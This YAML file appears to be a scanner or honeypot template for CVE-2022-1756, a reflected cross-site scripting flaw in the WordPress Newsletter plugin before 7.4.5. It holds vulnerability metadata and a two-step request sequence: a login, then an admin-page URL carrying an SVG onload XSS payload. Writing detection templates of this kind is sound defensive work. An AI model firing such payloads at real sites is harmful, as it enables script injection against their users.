id: CVE-2022-1756
info:
  name: Newsletter < 7.4.5 - Cross-Site Scripting
  author: Harsh
  description: 'The Newsletter WordPress plugin before 7.4.5 does not sanitize and
    escape the $_SERVER[''REQUEST_URI''] before echoing it back in admin pages. Although
    this uses addslashes, and most modern browsers automatically URLEncode requests,
    this is still vulnerable to Reflected XSS in older browsers such as Internet Explorer
    9 or below.

    '
  severity: medium
  impact: 'Allows attackers to inject malicious scripts into web pages viewed by users,
    leading to potential data theft or unauthorized actions.

    '
  remediation: Fixed in version 7.4.5
  reference:
  - https://wpscan.com/vulnerability/6ad407fe-db2b-41fb-834b-dd8c4f62b072
  - https://nvd.nist.gov/vuln/detail/CVE-2022-1756
  - https://wordpress.org/plugins/newsletter/
  - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-1756
    cwe-id: CWE-79
    epss-score: 0.00088
    epss-percentile: 0.36967
    cpe: cpe:2.3:a:thenewsletterplugin:newsletter:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: thenewsletterplugin
    product: newsletter
    framework: wordpress
    publicwww-query: /wp-content/plugins/newsletter/
  tags: cve,cve2022,wpscan,newsletter,xss,authenticated,thenewsletterplugin,wordpress
traps:
- request:
    method: POST
    path: /wp-login.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'log={{username}}&pwd={{password}}&wp-submit=Log+In

      '
  response:
    status_code: 200
    headers: {}
    body: newsletter><svg/onload=alert(/document.domain/)>
- request:
    method: GET
    path: /wp-admin/admin.php?page=newsletter_main_index&debug&"><svg/onload=alert(/document.domain/)>
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
